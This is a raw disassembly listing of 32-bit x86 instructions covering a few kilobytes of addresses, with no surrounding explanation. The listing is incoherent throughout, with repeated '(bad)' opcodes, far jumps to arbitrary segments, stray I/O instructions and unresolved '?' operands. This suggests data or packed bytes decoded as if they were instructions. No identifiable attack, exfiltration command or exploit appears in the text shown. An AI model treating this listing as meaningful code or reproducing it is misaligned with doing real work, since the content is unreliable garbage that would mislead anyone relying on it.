  482f08:	dec    esp
  482f09:	int    0xe4
  482f0b:	inc    eax
  482f0c:	(bad)  
  482f0d:	(bad)  
  482f0e:	fist   DWORD PTR [edi-0xe0cc670]
  482f14:	dec    esi
  482f15:	mov    ch,0x46
  482f17:	das    
  482f18:	test   esi,esi
  482f1a:	xchg   edx,eax
  482f1b:	mov    ch,BYTE PTR [edx+0x52602714]
  482f21:	cmp    BYTE PTR [ebx-0x75],0x1a
  482f25:	test   al,0xb5
  482f27:	stos   BYTE PTR es:[edi],al
  482f28:	jne    0x482f30
  482f2a:	iret   
  482f2b:	mov    bh,0xe2
  482f2d:	mov    DWORD PTR [eax+0x2d],edx
  482f30:	pop    edi
  482f31:	outs   dx,BYTE PTR ds:[esi]
  482f32:	add    BYTE PTR [edx],ch
  482f34:	mov    gs,WORD PTR [eax+0x65d054ef]
  482f3a:	push   ecx
  482f3b:	rcr    DWORD PTR [esi],1
  482f3d:	mov    bl,0xa1
  482f3f:	adc    DWORD PTR [ebx+0x1b],edx
  482f42:	in     al,dx
  482f43:	push   ebx
  482f44:	fild   QWORD PTR [esi]
  482f46:	jbe    0x482f11
  482f48:	cmovnp esi,eax
  482f4b:	sar    DWORD PTR [ebp+0x491f4a8b],1
  482f51:	(bad)  
  482f52:	(bad)  
  482f53:	inc    DWORD PTR [edx+0x22]
  482f56:	push   ebx
  482f57:	xor    dl,al
  482f59:	jmp    0xcf98:0x8e4acbca
  482f60:	xor    eax,DWORD PTR [edi-0x16]
  482f63:	test   BYTE PTR [ebp+0x4f],al
  482f66:	push   edi
  482f67:	(bad)  
  482f68:	(bad)  
  482f69:	jo     0x482f28
  482f6b:	inc    DWORD PTR [ebx-0x3b]
  482f6e:	call   esi
  482f70:	dec    ebx
  482f71:	mov    ecx,0x5588bbf6
  482f76:	fsubr  DWORD PTR [esi]
  482f78:	add    edi,ebx
  482f7a:	sub    eax,0xd7e22ea1
  482f7f:	popa   
  482f80:	push   ecx
  482f81:	inc    edx
  482f82:	mov    ebp,0xffffffe4
  482f87:	(bad)  
  482f88:	jmp    0x5c9f:0x7b2ad4e8
  482f8f:	in     al,0x32
  482f91:	jg     0x482f3b
  482f93:	jno    0x482f61
  482f95:	dec    esp
  482f96:	test   al,0x72
  482f98:	mov    ebx,DWORD PTR [ebx]
  482f9a:	adc    DWORD PTR [esi+0x6e],ebx
  482f9d:	jmp    0x9c7e2fb0
  482fa2:	inc    esp
  482fa3:	mov    cl,0x28
  482fa5:	cdq    
  482fa6:	adc    ebx,ebx
  482fa8:	or     BYTE PTR ds:0x1c763bcf,dl
  482fae:	or     BYTE PTR [ebx+0x7b],bh
  482fb1:	fbld   TBYTE PTR [ebx]
  482fb3:	inc    esp
  482fb4:	adc    DWORD PTR [edx-0x54e53029],ebp
  482fba:	mov    ds:0x1ccc4fd8,al
  482fbf:	fist   WORD PTR [ebp-0x1f]
  482fc2:	fadd   st,st(5)
  482fc4:	into   
  482fc5:	int    0x11
  482fc7:	inc    ebx
  482fc8:	inc    BYTE PTR [ebx+0x28]
  482fcb:	inc    BYTE PTR [edx+0x7f23bf6e]
  482fd1:	and    al,0x2c
  482fd3:	xchg   ecx,eax
  482fd4:	lahf   
  482fd5:	inc    DWORD PTR [edx+0x2e]
  482fd8:	push   ss
  482fd9:	pop    ds
  482fda:	and    DWORD PTR [esi+0x34999114],ecx
  482fe0:	cmp    edx,esi
  482fe2:	(bad)  
  482fe3:	(bad)  
  482fe4:	dec    DWORD PTR [edx]
  482fe6:	dec    esp
  482fe7:	mov    ebx,esp
  482fe9:	loopne 0x482ffa
  482feb:	and    BYTE PTR [esi+ebx*4+0x41],0xd6
  482ff0:	popf   
  482ff1:	push   ds
  482ff2:	jl     0x482fad
  482ff4:	jle    0x482fd6
  482ff6:	inc    edx
  482ff7:	mov    edx,esp
  482ff9:	sahf   
  482ffa:	xor    al,0x5a
  482ffc:	mov    edi,0xffff4d03
  483001:	jmp    edx
  483003:	mov    edi,0x6549bd09
  483008:	push   edi
  483009:	mov    bh,0x1a
  48300b:	inc    ebp
  48300c:	cdq    
  48300d:	mov    dl,BYTE PTR ds:0xa2413b28
  483013:	and    eax,0xb8644da8
  483018:	adc    dh,ch
  48301a:	sbb    BYTE PTR [esi],dl
  48301c:	enter  0x82ff,0x4a
  483020:	mov    esp,0x227b6fa4
  483025:	(bad)  
  483027:	inc    eax
  483028:	(bad)  
  483029:	call   0x616d:0x49a8fe93
  483030:	addr16 gs mov edi,0x1c622113
  483037:	jo     0x482fc6
  483039:	push   ds
  48303a:	dec    esi
  48303b:	lahf   
  48303c:	inc    eax
  48303d:	out    0xb9,eax
  48303f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  483040:	sub    BYTE PTR [edi-0x38],0xd5
  483044:	imul   edi,eax,0xffffffb3
  483047:	push   ss
  483048:	fdivr  QWORD PTR [ecx]
  48304a:	dec    esi
  48304b:	out    0xf9,al
  48304d:	(bad)  
  48304e:	lock xchg edx,eax
  483050:	dec    edi
  483051:	call   DWORD PTR [edi]
  483053:	jb     0x483006
  483055:	push   ebx
  483056:	pop    ds
  483057:	push   edx
  483058:	imul   esp,DWORD PTR [edx-0x4c],0xffffffeb
  48305c:	push   es
  48305d:	imul   eax,DWORD PTR es:[edx-0x63],0xffffff83
  483062:	(bad)  
  483063:	(bad)  
  483064:	(bad)  
  483065:	cmp    bl,BYTE PTR [eax]
  483067:	stc    
  483068:	dec    ebp
  483069:	mov    DWORD PTR [edi-0x31],edi
  48306c:	int3   
  48306d:	(bad)  
  48306e:	jae    0x483026
  483070:	popf   
  483071:	loop   0x482ff3
  483073:	inc    esi
  483074:	mov    esi,0x6cc57aa8
  483079:	jmp    0xffff:0xff4f3d4a
  483080:	pop    ss
  483081:	fiadd  WORD PTR [edx+0x12]
  483084:	mov    BYTE PTR [edi-0x78b3f35a],cl
  48308a:	sbb    bh,BYTE PTR [edx+eax*2+0x75992af3]
  483091:	sbb    cl,BYTE PTR ds:0x70c64b43
  483097:	fiadd  WORD PTR [ecx-0x6c]
  48309a:	nop
  48309b:	out    0x40,al
  48309d:	(bad)  
  48309e:	(bad)  ds:0xbab27bab
  4830a4:	jnp    0x4830b5
  4830a6:	add    DWORD PTR [esp+esi*1-0x59f9f7a5],esi
  4830ad:	pop    ds
  4830ae:	stos   BYTE PTR es:[edi],al
  4830af:	adc    al,0x3
  4830b1:	sbb    cl,BYTE PTR cs:[edi+0x2]
  4830b5:	pop    ss
  4830b6:	(bad)  
  4830b7:	xor    dh,BYTE PTR [ebp-0x15]
  4830ba:	in     al,dx
  4830bb:	pop    ds
  4830bc:	movlps QWORD PTR ds:0x6f2c422a,xmm7
  4830c3:	mov    edi,0x210696c
  4830c8:	outs   dx,DWORD PTR ds:[esi]
  4830c9:	outs   dx,DWORD PTR ds:[esi]
  4830ca:	or     ax,0xa07f
  4830ce:	out    dx,eax
  4830cf:	jns    0x483068
  4830d1:	pop    esp
  4830d2:	dec    esp
  4830d3:	or     dh,bl
  4830d5:	and    eax,0x767a1e6d
  4830da:	adc    eax,0x191f23f
  4830df:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4830e1:	popf   
  4830e2:	fst    QWORD PTR [edi+ebx*4-0xe09b]
  4830e9:	inc    edx
  4830ea:	cs les eax,FWORD PTR fs:[edi]
  4830ee:	dec    ebp
  4830ef:	mov    cl,0x13
  4830f1:	mov    cx,0x834c
  4830f5:	and    esi,DWORD PTR [edx+0x17]
  4830f8:	cmp    eax,0x55fe06f3
  4830fd:	inc    DWORD PTR [esi+esi*2-0x6c]
  483101:	aad    0x33
  483103:	or     eax,0x896e75c0
  483108:	xchg   BYTE PTR [eax+edi*1-0x5fe7195e],bh
  48310f:	(bad)  
  483110:	(bad)  
  483111:	jmp    DWORD PTR [edx]
  483113:	call   esi
  483115:	jbe    0x483114
  483117:	pop    ebp
  483118:	adc    al,0xa9
  48311a:	es inc esp
  48311c:	cdq    
  48311d:	dec    esi
  48311e:	xchg   edi,eax
  48311f:	mov    ah,0xf4
  483121:	mov    al,ds:0x90b1e18b
  483126:	imul   edi,eax,0x16
  483129:	sbb    BYTE PTR [ebx-0x310037e4],dl
  48312f:	dec    ebp
  483130:	mov    esp,0xebba8941
  483135:	jae    0x4830d0
  483137:	scas   al,BYTE PTR es:[edi]
  483138:	or     al,0x52
  48313a:	or     BYTE PTR [eax+0x721b86e],dh
  483140:	out    dx,eax
  483141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  483142:	push   eax
  483143:	aaa    
  483144:	inc    esp
  483145:	adc    DWORD PTR [edi],esi
  483147:	sti    
  483148:	ss or  eax,0xffae2e75
  48314e:	xor    BYTE PTR [esi],ch
  483150:	add    eax,0x5a87694
  483155:	push   esp
  483156:	sbb    DWORD PTR [edi+0x15],edx
  483159:	or     ch,dl
  48315b:	or     DWORD PTR [esp+ebx*1+0x6f01f622],edi
  483162:	repnz mov esp,0xbc018d81
  483168:	cs leave 
  48316a:	(bad)  
  48316b:	test   DWORD PTR [ebx+edi*8+0x7f],edi
  48316f:	lds    edx,FWORD PTR [edi]
  483171:	ret    0x16bd
  483174:	in     eax,dx
  483175:	int    0x11
  483177:	xchg   ebp,eax
  483178:	ins    BYTE PTR es:[edi],dx
  483179:	push   ds
  48317a:	ror    BYTE PTR [esi+0x4c],0xa
  48317e:	(bad)  
  48317f:	jmp    FWORD PTR [edx]
  483181:	loopne 0x483182
  483183:	mov    al,0xcc
  483185:	dec    edi
  483186:	sub    dh,cl
  483188:	(bad)  
  48318a:	adc    DWORD PTR [esi+0x260fde74],ecx
  483190:	clc    
  483191:	xor    bl,ch
  483193:	cs test al,0xa3
  483196:	mov    ds:0xd2ffffff,al
  48319b:	das    
  48319c:	inc    esp
  48319d:	mov    DWORD PTR [ebp+0x44],esi
  4831a0:	xchg   ebx,eax
  4831a1:	cmp    eax,ebp
  4831a3:	sub    DWORD PTR [edi-0xb],esi
  4831a6:	bound  ebx,QWORD PTR [ecx+0x42b603b6]
  4831ac:	dec    ecx
  4831ad:	mov    eax,0x1855403b
  4831b2:	addr16 (bad) 
  4831b4:	(bad)  
  4831b5:	dec    DWORD PTR [ebx+0x76146f50]
  4831bb:	add    BYTE PTR [esi+0x4573042b],al
  4831c1:	xchg   DWORD PTR [edi+0x59],ebx
  4831c4:	pop    edx
  4831c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4831c6:	clc    
  4831c7:	daa    
  4831c8:	(bad)  
  4831c9:	and    eax,0xcffffcd
  4831ce:	jg     0x4831c0
  4831d0:	test   eax,0x4ee52947
  4831d5:	scas   al,BYTE PTR es:[edi]
  4831d6:	xchg   DWORD PTR [esp+esi*2+0x1b],esi
  4831da:	jmp    0xda2831ed
  4831df:	xchg   edi,eax
  4831e0:	sbb    DWORD PTR [eax],edi
  4831e2:	add    al,0xc8
  4831e4:	add    esi,DWORD PTR [ebx+eiz*1]
  4831e7:	mov    WORD PTR [ebp+0x2c],ss
  4831ea:	xlat   BYTE PTR ds:[ebx]
  4831eb:	repz and eax,DWORD PTR [edi]
  4831ee:	out    0x9d,eax
  4831f0:	cmp    BYTE PTR [ebp+edx*2+0x1f],dh
  4831f4:	or     edi,DWORD PTR [edi-0x58]
  4831f7:	inc    eax
  4831f8:	inc    esi
  4831f9:	dec    esi
  4831fa:	in     al,dx
  4831fb:	arpl   WORD PTR [edi-0x1],di
  4831fe:	std    
  4831ff:	das    
  483200:	shr    al,1
  483202:	cli    
  483203:	test   al,0x93
  483205:	out    0xaa,eax
  483207:	outs   dx,DWORD PTR ds:[esi]
  483208:	or     BYTE PTR [eax-0x4fcecabe],al
  48320e:	inc    edx
  48320f:	es pop edx
  483211:	ins    BYTE PTR es:[edi],dx
  483212:	outs   dx,DWORD PTR ds:[esi]
  483213:	call   0xf75f971e
  483218:	adc    al,0x9e
  48321a:	adc    eax,DWORD PTR [ebx+0x61]
  48321d:	jo     0x483260
  48321f:	push   esp
  483220:	inc    ecx
  483221:	inc    edx
  483222:	fdiv   DWORD PTR [ebx]
  483224:	add    ch,BYTE PTR [esi]
  483226:	cmp    eax,0x59665703
  48322b:	jno    0x483223
  48322d:	pop    esi
  48322e:	mov    dl,0x53
  483230:	push   ebx
  483231:	adc    BYTE PTR [eax],al
  483233:	or     edi,esp
  483235:	and    edi,DWORD PTR [esi-0x2c1fb68]
  48323b:	(bad)  
  48323c:	or     DWORD PTR [eax],edi
  48323e:	add    DWORD PTR [edi+0x41dfeb8],ebx
  483244:	aas    
  483245:	repnz mov ebp,0x72166549
  48324b:	push   ds
  48324c:	mov    DWORD PTR [ebx+eax*2],eax
  48324f:	jp     0x483236
  483251:	int    0x86
  483253:	bound  ebp,QWORD PTR [edi+0x2a]
  483256:	or     DWORD PTR [ebx-0x15f539a2],0xff1f4282
  483260:	jmp    FWORD PTR [edi]
  483262:	in     al,0x41
  483264:	jecxz  0x483270
  483266:	add    eax,DWORD PTR [eax+0x4993c177]
  48326c:	xchg   edi,eax
  48326d:	dec    esp
  48326e:	test   al,0x58
  483270:	push   edi
  483271:	js     0x4832bb
  483273:	xor    dh,BYTE PTR [ebx-0x3aa1fc0]
  483279:	jmp    DWORD PTR [edi]
  48327b:	popf   
  48327c:	mov    al,ds:0x904d6389
  483281:	stos   DWORD PTR es:[edi],eax
  483282:	in     eax,0x19
  483284:	mov    esp,0xbfd5297b
  483289:	out    0xf,eax
  48328b:	(bad)  
  48328c:	(bad)  
  48328d:	inc    DWORD PTR [edx]
  48328f:	scas   al,BYTE PTR es:[edi]
  483290:	mov    bh,0x7b
  483292:	mov    al,bh
  483294:	or     al,0xb7
  483296:	out    0x40,eax
  483298:	mov    al,ds:0x6a47964f
  48329d:	dec    esi
  48329e:	gs sub esp,DWORD PTR cs:0x4ea351c5
  4832a6:	cmovs  ecx,DWORD PTR [eax]
  4832a9:	cmp    DWORD PTR [edi+edi*8],0xffffffb9
  4832ad:	mov    esp,0x6e7a5284
  4832b2:	inc    edx
  4832b3:	mul    dh
  4832b5:	push   ds
  4832b6:	les    ecx,FWORD PTR [eax-0x6b]
  4832b9:	je     0x4832b9
  4832bb:	adc    DWORD PTR [ebx+0x6a],esp
  4832be:	add    ch,al
  4832c0:	add    DWORD PTR [eiz*1+0x79e7253f],esi
  4832c7:	ficomp WORD PTR [ebx-0x36e93741]
  4832cd:	push   es
  4832ce:	retf   0xcccb
  4832d1:	rep outs dx,BYTE PTR ds:[esi]
  4832d3:	js     0x483273
  4832d5:	int    0xce
  4832d7:	iret   
  4832d8:	mov    bh,0xd1
  4832da:	push   es
  4832db:	rcl    al,cl
  4832dd:	jecxz  0x48331b
  4832df:	iret   
  4832e0:	rcl    esp,cl
  4832e2:	aad    0x77
  4832e4:	xlat   BYTE PTR ds:[ebx]
  4832e5:	ja     0x4832f3
  4832e7:	sbb    al,0xb
  4832e9:	fild   WORD PTR [edi-0xa5e705e]
  4832ef:	cmp    al,0xef
  4832f1:	cmp    eax,0x6da36d9
  4832f6:	(bad)  [eax-0x23]
  4832f9:	pop    ss
  4832fa:	adc    BYTE PTR [ebx+0x1a],cl
  4832fd:	pop    edx
  4832fe:	fdivp  st(3),st
  483300:	jmp    0x4c3e6153
  483305:	inc    DWORD PTR [ebx]
  483307:	das    
  483308:	sbb    BYTE PTR [esi+ebp*1],al
  48330b:	in     al,0xe4
  48330d:	inc    edx
  48330e:	xor    BYTE PTR [esi],al
  483310:	dec    eax
  483311:	mov    edx,0xf84e88bb
  483316:	punpcklbw mm5,DWORD PTR [esi]
  483319:	shr    BYTE PTR ds:[eax+0x786f28f3],1
  483320:	jmp    0xd99a4944
  483325:	lods   al,BYTE PTR ds:[esi]
  483326:	scas   al,BYTE PTR es:[edi]
  483327:	dec    edi
  483328:	loopne 0x483335
  48332a:	dec    ebp
  48332b:	dec    eax
  48332c:	add    eax,0xae0e2ef0
  483331:	sub    dl,BYTE PTR [eax+0x36]
  483334:	push   ecx
  483335:	add    ch,bl
  483337:	cs aas 
  483339:	sub    ebp,DWORD PTR [edi-0x434bd098]
  48333f:	stos   DWORD PTR es:[edi],eax
  483340:	(bad)  
  483341:	lahf   
  483342:	add    al,0xbe
  483344:	and    BYTE PTR [ebx+ebx*1],0xdc
  483348:	aam    0x5f
  48334a:	cwde   
  48334b:	cs pop ds
  48334d:	popf   
  48334e:	std    
  48334f:	ja     0x483372
  483351:	daa    
  483352:	iret   
  483353:	or     esi,DWORD PTR [eax-0x62d137db]
  483359:	je     0x4833a6
  48335b:	sahf   
  48335c:	adc    BYTE PTR [esi],ah
  48335e:	(bad)  
  48335f:	loopne 0x48338a
  483361:	out    dx,eax
  483362:	xchg   edx,eax
  483363:	xchg   ebx,eax
  483364:	mov    ebx,DWORD PTR [edi-0x8]
  483367:	sub    al,0x1a
  483369:	mov    esi,0xd57a2b10
  48336e:	xchg   ecx,eax
  48336f:	push   eax
  483370:	inc    ecx
  483371:	ins    BYTE PTR es:[edi],dx
  483372:	add    dh,BYTE PTR [edi+0x41]
  483375:	fs fs fs ja 0x483391
  48337a:	mov    dh,0x5b
  48337c:	and    edi,DWORD PTR [edi+0x72]
  48337f:	jb     0x4833f0
  483381:	ja     0x4833f6
  483383:	inc    esp
  483384:	data16 je 0x4833ec
  483387:	pop    ss
  483388:	jne    0x483341
  48338a:	scas   al,BYTE PTR es:[edi]
  48338b:	jl     0x4833e2
  48338d:	jo     0x4833f3
  48338f:	popa   
  483390:	jo     0x483402
  483392:	sub    BYTE PTR gs:[esi+0x63],0x65
  483397:	lock pop ebx
  483399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48339a:	push   esi
  48339b:	xchg   ebp,eax
  48339c:	jns    0x4833c0
  48339e:	jne    0x48340d
  4833a0:	outs   dx,BYTE PTR ds:[esi]
  4833a1:	or     DWORD PTR [esi-0x20],esp
  4833a4:	xor    edx,ebx
  4833a6:	jae    0x48336d
  4833a8:	push   DWORD PTR [ebp-0x3]
  4833ab:	imul   ebp,DWORD PTR [esi+0x69574c66],0x64
  4833b2:	je     0x48341c
  4833b4:	or     eax,0x68676952
  4833b9:	je     0x48340f
  4833bb:	outs   dx,DWORD PTR ds:[esi]
  4833bc:	outs   dx,DWORD PTR ds:[esi]
  4833bd:	adc    bl,BYTE PTR [edx-0x4b]
  4833c0:	dec    esp
  4833c1:	cmp    BYTE PTR [ebx+edi*8+0x41],dh
  4833c5:	and    BYTE PTR [ebx+0x73],dh
  4833c8:	push   ebx
  4833c9:	jo     0x48334d
  4833cb:	in     eax,dx
  4833cc:	push   edi
  4833cd:	imul   BYTE PTR [ecx+ebp*2+0x74]
  4833d1:	jae    0x4833f2
  4833d3:	dec    ecx
  4833d4:	push   edi
  4833d5:	clc    
  4833d6:	jo     0x48341b
  4833d8:	cs fdivr st,st(3)
  4833db:	into   
  4833dc:	std    
  4833dd:	ins    BYTE PTR es:[edi],dx
  4833de:	push   eax
  4833df:	outs   dx,DWORD PTR ds:[esi]
  4833e0:	imul   ebp,DWORD PTR [esi+0x74],0x6d86ac97
  4833e7:	popa   
  4833e8:	dec    edx
  4833e9:	inc    ebx
  4833ea:	sbb    dh,BYTE PTR ds:0xa20e81d0
  4833f0:	xor    eax,0xf7044186
  4833f5:	xor    edi,0x3606c781
  4833fb:	out    dx,eax
  4833fc:	cmp    cl,BYTE PTR ds:0x30843a54
  483402:	enter  0x3662,0x80
  483406:	adc    esi,ebx
  483408:	push   eax
  483409:	jne    0x48344c
  48340b:	jbe    0x48344e
  48340d:	push   0x6a
  48340f:	and    cl,cl
  483411:	lahf   
  483412:	pop    ebp
  483413:	inc    edi
  483414:	push   edx
  483415:	inc    esp
  483416:	pop    ebp
  483417:	jmp    0x1100:0x17d86c7d
  48341e:	xchg   edx,eax
  48341f:	sub    BYTE PTR [eax],al
  483421:	pop    es
  483422:	dec    esi
  483423:	test   al,0x13
  483425:	adc    dl,BYTE PTR [esi-0x75206b4a]
  48342b:	(bad)  
  48342c:	call   FWORD PTR [ebx+0x4f1d1e78]
  483432:	adc    BYTE PTR [ebx-0x6c],dh
  483435:	outs   dx,DWORD PTR fs:[esi]
  483437:	dec    eax
  483438:	sbb    bl,0x77
  48343b:	lahf   
  48343c:	and    DWORD PTR [ecx],0x6e46d772
  483442:	loop   0x483465
  483444:	mov    ebp,0x37a60305
  483449:	dec    ecx
  48344a:	cmp    ecx,DWORD PTR [eax+0x7]
  48344d:	push   esp
  48344e:	inc    eax
  48344f:	mov    bh,0x19
  483451:	add    al,0x83
  483453:	hlt    
  483454:	pop    ebx
  483455:	push   ds
  483456:	daa    
  483457:	add    dl,BYTE PTR [edi-0x67f0ab58]
  48345d:	outs   dx,BYTE PTR ds:[esi]
  48345e:	bound  ebp,QWORD PTR [eax]
  483460:	ja     0x4834ca
  483462:	push   ds
  483463:	aas    
  483464:	dec    edi
  483465:	ficom  WORD PTR [ebx]
  483467:	pop    ebp
  483468:	rol    DWORD PTR [ecx],cl
  48346a:	rcr    BYTE PTR [esi-0x50],1
  48346d:	in     al,0x4a
  48346f:	xchg   ebp,eax
  483470:	cmp    al,0x27
  483472:	xchg   edi,eax
  483473:	inc    edi
  483474:	cmp    al,0x74
  483476:	add    DWORD PTR [ecx+0x4e],edi
  483479:	es in  al,0x5c
  48347c:	adc    eax,0x2e0b844c
  483481:	mov    eax,0x5c202b90
  483486:	pop    ds
  483487:	mov    WORD PTR [eax+0x64],?
  48348a:	add    BYTE PTR [ecx+0x7],bh
  48348d:	sbb    BYTE PTR [eax+ebp*2-0x7cfa08b9],al
  483494:	sbb    DWORD PTR [edi-0x61],0x5f2f1608
  48349b:	(bad)  
  48349c:	aas    
  48349d:	or     cl,0x83
  4834a0:	inc    esi
  4834a1:	outs   dx,BYTE PTR ds:[esi]
  4834a2:	addr16 inc esi
  4834a4:	imul   ecx,DWORD PTR [edx+0x5bbaef77],0x19731730
  4834ae:	xor    al,0x37
  4834b0:	addr16 jns 0x483522
  4834b3:	pop    ecx
  4834b4:	mov    esi,DWORD PTR [ebx+0x45]
  4834b7:	dec    ebx
  4834b8:	imul   edx,DWORD PTR [ebx],0x66997c55
  4834be:	loop   0x483506
  4834c0:	or     al,BYTE PTR [esi+eiz*2+0x6f]
  4834c4:	xchg   ebx,eax
  4834c5:	je     0x4834d8
  4834c7:	push   cs
  4834c8:	gs aam 0x24
  4834cb:	lahf   
  4834cc:	cmp    al,0x5c
  4834ce:	jle    0x483450
  4834d0:	sbb    eax,DWORD PTR ds:0x2dda0801
  4834d6:	out    dx,eax
  4834d7:	xchg   edx,eax
  4834d8:	pop    es
  4834d9:	push   es
  4834da:	aas    
  4834db:	xchg   edx,eax
  4834dc:	add    BYTE PTR [ecx],al
  4834de:	stos   BYTE PTR es:[edi],al
  4834df:	sbb    ebx,DWORD PTR [edx+0x1e02b5d2]
  4834e5:	sti    
  4834e6:	call   esi
  4834e8:	jl     0x4834ed
  4834ea:	pop    es
  4834eb:	mov    ds:0x3c602ad1,eax
  4834f0:	aad    0x6
  4834f2:	push   esp
  4834f3:	jo     0x4834fa
  4834f5:	pop    es
  4834f6:	inc    ebp
  4834f7:	pop    ss
  4834f8:	push   cs
  4834f9:	sub    bl,BYTE PTR [ecx+0x31300708]
  4834ff:	inc    esi
  483500:	xor    ah,dh
  483502:	adc    al,0x7
  483504:	xor    BYTE PTR [edi],bl
  483506:	daa    
  483507:	ds icebp 
  483509:	adc    al,0xc6
  48350b:	test   al,0x41
  48350d:	cdq    
  48350e:	mov    cl,0x4d
  483510:	sahf   
  483511:	scas   eax,DWORD PTR es:[edi]
  483512:	xor    DWORD PTR [edi],esi
  483514:	xor    esi,DWORD PTR [ecx]
  483516:	dec    edi
  483517:	mov    ecx,0xc93ce180
  48351c:	or     cl,BYTE PTR [edi]
  48351e:	xor    al,0xa5
  483520:	ss scas al,BYTE PTR es:[edi]
  483522:	add    esi,DWORD PTR [ecx]
  483524:	jno    0x483551
  483526:	push   edi
  483527:	lods   al,BYTE PTR ds:[esi]
  483528:	xor    DWORD PTR [esi+0x39893903],eax
  48352e:	mov    ebx,0xda6dc133
  483533:	bound  esi,QWORD PTR [ebx+0x57]
  483536:	cmp    DWORD PTR [edi],esp
  483538:	inc    edx
  483539:	pop    es
  48353a:	push   ebx
  48353b:	or     eax,0xd3345da3
  483540:	pop    ss
  483541:	xor    eax,0x62e42b86
  483546:	aas    
  483547:	xor    DWORD PTR [edx],esi
  483549:	movlhps xmm3,xmm2
  48354c:	dec    edx
  48354d:	mov    ?,WORD PTR [ecx]
  48354f:	cmp    DWORD PTR [ebx+0x21b046d4],0x31
  483556:	aas    
  483557:	adc    bh,BYTE PTR [eax]
  483559:	mov    ah,0x45
  48355b:	and    BYTE PTR [edi+0x27],al
  48355e:	xor    bh,bl
  483560:	xchg   esi,eax
  483561:	ret    0x325d
  483564:	xor    al,0x39
  483566:	out    dx,al
  483567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  483568:	lock arpl WORD PTR [eax],cx
  48356b:	call   0x11c:0x38ff442f
  483572:	push   esp
  483573:	push   edi
  483574:	sti    
  483575:	inc    ebx
  483576:	aaa    
  483577:	xor    esp,DWORD PTR [eax]
  483579:	in     al,0xa
  48357b:	push   ds
  48357c:	sbb    eax,DWORD PTR [ebp+0x7]
  48357f:	xor    DWORD PTR [edx],ebp
  483581:	push   esi
  483582:	shl    esp,1
  483584:	xor    al,0x97
  483586:	(bad)  
  483588:	(bad)  
  483589:	cs mov ah,0xcd
  48358c:	xchg   DWORD PTR [bx],esi
  48358f:	scas   al,BYTE PTR es:[edi]
  483590:	mov    ebp,DWORD PTR [edi+0xa]
  483593:	stc    
  483594:	ss pop ss
  483596:	inc    ebp
  483597:	aaa    
  483598:	aas    
  483599:	in     eax,dx
  48359a:	pop    esp
  48359b:	push   ebp
  48359c:	stos   DWORD PTR es:[edi],eax
  48359d:	pop    ss
  48359e:	inc    ebx
  48359f:	daa    
  4835a0:	shr    DWORD PTR [ebp-0x4a],cl
  4835a3:	or     eax,0x360faf31
  4835a8:	mov    edi,0xa9480336
  4835ad:	sub    BYTE PTR [esi+0x17],dl
  4835b0:	cwde   
  4835b1:	xor    al,0x38
  4835b3:	out    dx,eax
  4835b4:	fadd   DWORD PTR [esi+0x6]
  4835b7:	inc    ebx
  4835b8:	jg     0x4835ec
  4835ba:	mov    eax,0xc7a268a2
  4835bf:	xor    al,0x6f
  4835c1:	cmp    DWORD PTR [ebp+0x47041c95],esi
  4835c7:	xor    bh,BYTE PTR [edi+0x32472d1]
  4835cd:	xor    DWORD PTR ss:[edi-0x7f],edx
  4835d1:	push   ebx
  4835d2:	adc    BYTE PTR [edx+edi*1],0x45
  4835d6:	or     eax,0x5fd517c9
  4835db:	xor    al,BYTE PTR [eax]
  4835dd:	xor    al,0x39
  4835df:	mov    cl,0xe7
  4835e1:	stos   BYTE PTR es:[edi],al
  4835e2:	fiadd  DWORD PTR [edx]
  4835e4:	cs xor ecx,edi
  4835e7:	cmp    DWORD PTR [edi+ebx*1],esi
  4835ea:	cmp    esi,esi
  4835ec:	sbb    eax,0x5f373572
  4835f1:	xor    DWORD PTR [edi],ebx
  4835f3:	ss pop ebp
  4835f5:	enter  0x7207,0x46
  4835f9:	cmp    BYTE PTR [eax],al
  4835fb:	inc    esp
  4835fc:	inc    ebx
  4835fd:	add    ecx,DWORD PTR [ebx+0x4]
  483600:	mov    edi,DWORD PTR [edi+0x7]
  483603:	mov    edi,0xf35bc838
  483608:	cmp    BYTE PTR [edi],ch
  48360a:	pop    ds
  48360b:	cmp    BYTE PTR ds:[edi-0x59e44f8a],dh
  483612:	pop    ds
  483613:	inc    ebp
  483614:	mov    edi,0x60adb61f
  483619:	or     al,0x30
  48361b:	jg     0x4835b8
  48361d:	pop    ds
  48361e:	nop
  48361f:	sub    BYTE PTR [esi],ah
  483621:	fistp  QWORD PTR [edi]
  483623:	xor    DWORD PTR [edi],edx
  483625:	rol    ecx,0xc6
  483628:	pop    eax
  483629:	aas    
  48362a:	lods   al,BYTE PTR ds:[esi]
  48362b:	pop    ds
  48362c:	xor    al,0x7f
  48362e:	jbe    0x48363d
  483630:	(bad)  
  483631:	push   ss
  483632:	sahf   
  483633:	inc    esp
  483634:	pop    ds
  483635:	pop    ss
  483636:	lods   al,BYTE PTR es:[esi]
  483638:	mov    ebp,0x1fdbfee5
  48363d:	scas   eax,DWORD PTR es:[edi]
  48363e:	push   eax
  48363f:	or     eax,0x331fdae4
  483644:	aaa    
  483645:	sub    eax,0x3637c81a
  48364a:	mov    edi,0x8ab98342
  48364f:	mov    DWORD PTR [ebp+0x5f301fdf],ebp
  483655:	aaa    
  483656:	pop    ebp
  483657:	or     al,0x5
  483659:	sub    ebx,DWORD PTR [edx-0x4bc700ca]
  48365f:	aaa    
  483660:	add    eax,0x43075f8b
  483665:	pop    edi
  483666:	(bad)  
  483667:	fcom   st(5)
  483669:	fidivr DWORD PTR [ebx+0x5f1f071e]
  48366f:	pop    ds
  483670:	pop    ss
  483671:	xor    bl,BYTE PTR [ebx+0x1b]
  483674:	xor    bh,bl
  483676:	jg     0x4836ab
  483678:	inc    esp
  483679:	jecxz  0x48361b
  48367b:	jmp    0x4836df
  48367d:	aas    
  48367e:	cmp    BYTE PTR [edi],bh
  483680:	cmp    BYTE PTR [esi+eax*1+0x319faefb],bh
  483687:	mov    edi,0x72731f45
  48368c:	mov    cl,0x81
  48368e:	(bad)  
  48368f:	pop    ds
  483690:	push   0x6d58411f
  483695:	and    DWORD PTR [edi],edx
  483697:	cmp    edi,edi
  483699:	fsub   QWORD PTR [edx-0x48]
  48369c:	loopne 0x4836bd
  48369e:	xor    bh,BYTE PTR [edi+0x1f]
